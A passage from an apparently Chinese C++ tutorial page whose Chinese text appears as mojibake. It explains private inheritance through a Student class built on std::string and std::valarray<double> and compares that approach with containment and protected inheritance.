class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STUDENTI_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STUDENTI_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ç§æœ‰ç»§æ‰¿çš„ Student ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> :</span> <span class="keyword">private</span> <span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">private</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œç”¨äºè¾“å‡ºåˆ†æ•°</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šç°åœ¨å¯ä»¥ç›´æ¥è®¿é—® valarray çš„æ–¹æ³•ï¼Œä½†å®ƒä»¬æ˜¯ç§æœ‰çš„</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="comment">// éœ€è¦æ˜¾å¼è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    Student() : <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;Null Student&quot;</span>), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Student</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s)</span></span></span><br><span class="line">        : std::string(s), std::valarray&lt;double&gt;() &#123;&#125;</span><br><span class="line">    explicit Student(int n) : std::string(&quot;Nully&quot;), std::valarray&lt;double&gt;(n) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">int</span> n)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(s), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(n) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s, <span class="keyword">const</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &amp; a)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(s), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(a) &#123;&#125;</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="keyword">char</span> * str, <span class="keyword">const</span> <span class="keyword">double</span> * pd, <span class="keyword">int</span> n)</span><br><span class="line">        : <span class="built_in">std</span>::<span class="built_in">string</span>(str), <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;(pd, n) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    ~Student() &#123;&#125; <span class="comment">// ææ„å‡½æ•° (é»˜è®¤å³å¯)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å™¨ - éœ€è¦è‡ªå·±æä¾›æ¥å£ï¼Œä¸èƒ½ç›´æ¥ç”¨åŸºç±»çš„</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="keyword">double</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="keyword">double</span> <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// æä¾›è®¿é—®å§“åçš„æ¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‹å…ƒå‡½æ•° - ç”¨äºè¾“å…¥è¾“å‡º</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="keyword">operator</span>&gt;&gt;(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu);</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="built_in">std</span>::istream &amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream &amp; is, Student &amp; stu)</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Student &amp; stu);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STUDENTI_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>studenti.cpp (å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studenti.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ostream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::istream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::valarray;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¬æœ‰æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è®¿é—® valarray çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private)</span></span><br><span class="line">    <span class="keyword">if</span> (valarray&lt;<span class="keyword">double</span>&gt;::size() &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::sum() / valarray&lt;<span class="keyword">double</span>&gt;::size();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="built_in">string</span> &amp; <span class="title">Student::Name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è®¿é—® string çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private)</span></span><br><span class="line">    <span class="comment">// éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢å›åŸºç±»ç±»å‹æ¥è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">const</span> <span class="built_in">string</span> &amp;) *<span class="keyword">this</span>; <span class="comment">// å°† *this è½¬æ¢ä¸ºå¯¹åŸºç±» string çš„å¼•ç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ [] è®¿é—®åˆ†æ•°</span></span><br><span class="line"><span class="keyword">double</span> &amp; Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è®¿é—® valarray çš„ public æ–¹æ³• (åœ¨ Student å†…éƒ¨æ˜¯ private)</span></span><br><span class="line">    <span class="comment">// éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢å›åŸºç±»ç±»å‹æ¥è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[](i); <span class="comment">// æˆ–è€… ((valarray&lt;double&gt; &amp;)*this)[i];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> Student::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[](i); <span class="comment">// æˆ–è€… ((const valarray&lt;double&gt; &amp;)*this)[i];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç§æœ‰æ–¹æ³•å®ç°</span></span><br><span class="line"><span class="function">ostream &amp; <span class="title">Student::arr_out</span><span class="params">(ostream &amp; os)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> lim = valarray&lt;<span class="keyword">double</span>&gt;::size();</span><br><span class="line">    <span class="keyword">if</span> (lim &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lim; i++) &#123;</span><br><span class="line">            os &lt;&lt; <span class="keyword">operator</span>[](i) &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// ä½¿ç”¨ Student::operator[]</span></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">4</span>)</span><br><span class="line">                os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">0</span>)</span><br><span class="line">            os &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        os &lt;&lt; <span class="string">&quot; empty array &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‹å…ƒå‡½æ•°å®ç°</span></span><br><span class="line"><span class="comment">// å‹å…ƒå¯ä»¥è®¿é—®æ´¾ç”Ÿç±»çš„ç§æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ç»§æ‰¿æ¥çš„ç§æœ‰æˆå‘˜ï¼ˆåŸåŸºç±»çš„å…¬æœ‰/ä¿æŠ¤æˆå‘˜ï¼‰</span></span><br><span class="line">istream &amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp; is, Student &amp; stu) &#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„ string éƒ¨åˆ† (ç°åœ¨æ˜¯ stu çš„ç§æœ‰éƒ¨åˆ†)</span></span><br><span class="line">    is &gt;&gt; (<span class="built_in">string</span> &amp;)stu; <span class="comment">// éœ€è¦ç±»å‹è½¬æ¢</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">istream &amp; <span class="title">getline</span><span class="params">(istream &amp; is, Student &amp; stu)</span> </span>&#123;</span><br><span class="line">    getline(is, (<span class="built_in">string</span> &amp;)stu); <span class="comment">// éœ€è¦ç±»å‹è½¬æ¢</span></span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, <span class="keyword">const</span> Student &amp; stu) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Scores for &quot;</span> &lt;&lt; (<span class="keyword">const</span> <span class="built_in">string</span> &amp;) stu &lt;&lt; <span class="string">&quot;:\n&quot;</span>; <span class="comment">// éœ€è¦ç±»å‹è½¬æ¢</span></span><br><span class="line">    stu.arr_out(os); <span class="comment">// è°ƒç”¨ç§æœ‰è¾…åŠ©å‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ç¤ºä¾‹ (use_stui.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;studenti.h&quot;</span> <span class="comment">// ä½¿ç”¨ç§æœ‰ç»§æ‰¿ç‰ˆæœ¬</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span></span>; <span class="comment">// å‡½æ•°åŸå‹ (åŒä¹‹å‰)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> pupils = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> quizzes = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student ada[pupils] = &#123;Student(quizzes), Student(quizzes), Student(quizzes)&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">set</span>(ada[i], quizzes);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStudent List:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ada[i].Name() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ Student æä¾›çš„ Name() æ¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nResults:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pupils; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; ada[i]; <span class="comment">// è°ƒç”¨ Student çš„ operator&lt;&lt;</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;average: &quot;</span> &lt;&lt; ada[i].Average() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ Student çš„ Average()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ— æ³•ç›´æ¥è®¿é—®åŸºç±»æ–¹æ³•</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; ada[0].size(); // é”™è¯¯ï¼valarray::size() åœ¨ Student ä¸­æ˜¯ private</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; ada[0].length(); // é”™è¯¯ï¼string::length() åœ¨ Student ä¸­æ˜¯ private</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ— æ³•å°†æ´¾ç”Ÿç±»æŒ‡é’ˆéšå¼è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ</span></span><br><span class="line">    <span class="comment">// string * pstr = &amp;ada[0]; // é”™è¯¯ï¼</span></span><br><span class="line">    <span class="comment">// valarray&lt;double&gt; * pva = &amp;ada[0]; // é”™è¯¯ï¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set å‡½æ•°å®šä¹‰ (åŒä¹‹å‰)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(Student &amp; sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the student&#x27;s name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">cin</span>, sa); <span class="comment">// ä½¿ç”¨å‹å…ƒ getline</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; quiz scores:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; sa[i]; <span class="comment">// ä½¿ç”¨ Student::operator[]</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è¯´æ˜:</strong></p><ul><li>  <code>Student</code> ç±»é€šè¿‡ç§æœ‰ç»§æ‰¿è·å¾—äº† <code>string</code> å’Œ <code>valarray&lt;double&gt;</code> çš„æ‰€æœ‰å®ç°ã€‚</li><li>  æ„é€ å‡½æ•°é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°ã€‚</li><li>  ç”±äºåŸºç±»çš„å…¬æœ‰æ–¹æ³•åœ¨ <code>Student</code> ä¸­å˜ä¸ºç§æœ‰ï¼Œ<code>Student</code> ç±»å¿…é¡»æä¾›è‡ªå·±çš„å…¬æœ‰æ¥å£ï¼ˆå¦‚ <code>Average()</code>, <code>Name()</code>, <code>operator[]</code>ï¼‰æ¥æš´éœ²æ‰€éœ€çš„åŠŸèƒ½ã€‚</li><li>  åœ¨ <code>Student</code> çš„æˆå‘˜å‡½æ•°æˆ–å‹å…ƒå‡½æ•°å†…éƒ¨ï¼Œéœ€è¦é€šè¿‡<strong>æ˜¾å¼ç±»å‹è½¬æ¢</strong>ï¼ˆå¦‚ <code>(const string &amp;) *this</code> æˆ– <code>valarray&lt;double&gt;::sum()</code>ï¼‰æ¥è°ƒç”¨ç»§æ‰¿æ¥çš„åŸºç±»æ–¹æ³•ï¼ˆå› ä¸ºå®ƒä»¬ç°åœ¨æ˜¯ <code>Student</code> çš„ç§æœ‰æˆå‘˜ï¼‰ã€‚</li><li>  å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®ç»§æ‰¿æ¥çš„åŸºç±»æ–¹æ³•ï¼Œä¹Ÿä¸èƒ½å°† <code>Student</code> å¯¹è±¡éšå¼è½¬æ¢ä¸º <code>string</code> æˆ– <code>valarray&lt;double&gt;</code>ã€‚</li></ul><h3 id="14-2-2-ä½¿ç”¨åŒ…å«è¿˜æ˜¯ç§æœ‰ç»§æ‰¿"><a href="#14-2-2-ä½¿ç”¨åŒ…å«è¿˜æ˜¯ç§æœ‰ç»§æ‰¿" class="headerlink" title="14.2.2 ä½¿ç”¨åŒ…å«è¿˜æ˜¯ç§æœ‰ç»§æ‰¿"></a>14.2.2 ä½¿ç”¨åŒ…å«è¿˜æ˜¯ç§æœ‰ç»§æ‰¿</h3><p>å¯¹äº â€œhas-aâ€ æˆ– â€œis-implemented-in-terms-ofâ€ çš„å…³ç³»ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨<strong>åŒ…å« (ç»„åˆ)**ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨</strong>ç§æœ‰ç»§æ‰¿**ã€‚é‚£ä¹ˆå¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿ</p><p><strong>é€šå¸¸æ¨èä½¿ç”¨åŒ…å« (ç»„åˆ):</strong></p><ul><li>  <strong>æ›´æ¸…æ™°:</strong> æ˜ç¡®è¡¨ç¤º â€œhas-aâ€ å…³ç³»ï¼Œä»£ç æ›´æ˜“äºç†è§£ã€‚<code>Student</code> ç±»åŒ…å«ä¸€ä¸ª <code>name</code> æˆå‘˜å’Œä¸€ä¸ª <code>scores</code> æˆå‘˜ï¼Œè¿™å¾ˆç›´è§‚ã€‚</li><li>  <strong>æ›´ç®€å•:</strong> ä¸éœ€è¦å¤„ç†ç»§æ‰¿å¸¦æ¥çš„å¤æ‚æ€§ï¼ˆå¦‚è®¿é—®æ§åˆ¶å˜åŒ–ã€æ„é€ å‡½æ•°è°ƒç”¨é“¾ã€åç§°å†²çªç­‰ï¼‰ã€‚</li><li><strong>æ›´çµæ´»:</strong><ul><li>  å¯ä»¥è½»æ¾åŒ…å«<strong>å¤šä¸ª</strong>åŒç±»å‹çš„æˆå‘˜å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªå­¦ç”Ÿå¯ä»¥æœ‰å®¶åº­ä½å€å’Œå­¦æ ¡ä½å€ä¸¤ä¸ª <code>string</code> æˆå‘˜ï¼‰ã€‚ç§æœ‰ç»§æ‰¿é€šå¸¸åªèƒ½ç»§æ‰¿ä¸€ä¸ªåŸºç±»ä¸€æ¬¡ï¼ˆè™½ç„¶å¤šé‡ç»§æ‰¿æ˜¯å¯èƒ½çš„ï¼Œä½†æ›´å¤æ‚ï¼‰ã€‚</li><li>  å¯ä»¥åŒ…å«æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå®ç°æ›´æ¾æ•£çš„è€¦åˆã€‚</li></ul></li><li>  <strong>å°è£…æ€§æ›´å¥½:</strong> åŒ…å«ç±»åªèƒ½é€šè¿‡æˆå‘˜å¯¹è±¡çš„å…¬æœ‰æ¥å£ä¸å…¶äº¤äº’ï¼Œä¸ä¼šæ„å¤–åœ°ä¾èµ–å…¶å®ç°ç»†èŠ‚ï¼ˆé™¤éæˆå‘˜å¯¹è±¡æœ¬èº«å°è£…ä¸ä½³ï¼‰ã€‚</li></ul><p><strong>ç§æœ‰ç»§æ‰¿çš„å¯èƒ½ä¼˜åŠ¿ (ç›¸å¯¹å°‘è§):</strong></p><ul><li>  <strong>è®¿é—® <code>protected</code> æˆå‘˜:</strong> å¦‚æœæ´¾ç”Ÿç±»éœ€è¦è®¿é—®åŸºç±»çš„ <code>protected</code> æˆå‘˜ï¼ˆæ•°æ®æˆ–å‡½æ•°ï¼‰ï¼Œç§æœ‰ç»§æ‰¿æä¾›äº†è¿™ç§èƒ½åŠ›ï¼Œè€ŒåŒ…å«åˆ™ä¸è¡Œï¼ˆé™¤éé€šè¿‡å‹å…ƒï¼‰ã€‚</li><li>  <strong>è¦†ç›–è™šå‡½æ•°:</strong> å¦‚æœéœ€è¦è¦†ç›–åŸºç±»çš„è™šå‡½æ•°ï¼ˆå³ä½¿æ˜¯ç§æœ‰ç»§æ‰¿ï¼ŒåŸºç±»çš„è™šå‡½æ•°åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯è™šå‡½æ•°ï¼Œåªæ˜¯è®¿é—®æƒé™å˜ä¸º <code>private</code>ï¼‰ï¼Œç§æœ‰ç»§æ‰¿æ˜¯å¿…è¦çš„ã€‚è¿™åœ¨ä½¿ç”¨ç­–ç•¥æ¨¡å¼æˆ–æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„æŸäº›å˜ä½“æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†è¾ƒä¸ºé«˜çº§ã€‚</li><li>  <strong>ç©ºåŸºç±»ä¼˜åŒ– (EBO - Empty Base Optimization):</strong> åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœåŸºç±»æ˜¯ç©ºçš„ï¼ˆæ²¡æœ‰éé™æ€æ•°æ®æˆå‘˜ï¼‰ï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼˜åŒ–æ‰åŸºç±»å­å¯¹è±¡å ç”¨çš„ç©ºé—´ï¼Œä½¿å¾—ç§æœ‰ç»§æ‰¿çš„å¯¹è±¡æ¯”åŒ…å«åŒæ ·ç©ºç±»æˆå‘˜çš„å¯¹è±¡æ›´å°ã€‚ä½†è¿™é€šå¸¸æ˜¯å¾®ä¼˜åŒ–ï¼Œä¸åº”ä½œä¸ºä¸»è¦é€‰æ‹©ä¾æ®ã€‚</li></ul><p><strong>ç»“è®º:</strong> å¯¹äºå¤§å¤šæ•° â€œhas-aâ€ å…³ç³»ï¼Œ**ä¼˜å…ˆé€‰æ‹©åŒ…å« (ç»„åˆ)**ã€‚åªæœ‰åœ¨éœ€è¦è®¿é—®åŸºç±»çš„ <code>protected</code> æˆå‘˜æˆ–è¦†ç›–å…¶è™šå‡½æ•°ç­‰ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæ‰è€ƒè™‘ä½¿ç”¨ç§æœ‰ç»§æ‰¿ã€‚</p><h3 id="14-2-3-ä¿æŠ¤ç»§æ‰¿"><a href="#14-2-3-ä¿æŠ¤ç»§æ‰¿" class="headerlink" title="14.2.3 ä¿æŠ¤ç»§æ‰¿"></a>14.2.3 ä¿æŠ¤ç»§æ‰¿</h3><p>é™¤äº† <code>public</code> å’Œ <code>private</code> ç»§æ‰¿ï¼Œè¿˜æœ‰**ä¿æŠ¤ç»§æ‰¿ (<code>protected</code>)**ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> <span class="keyword">protected</span> BaseClassName &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span 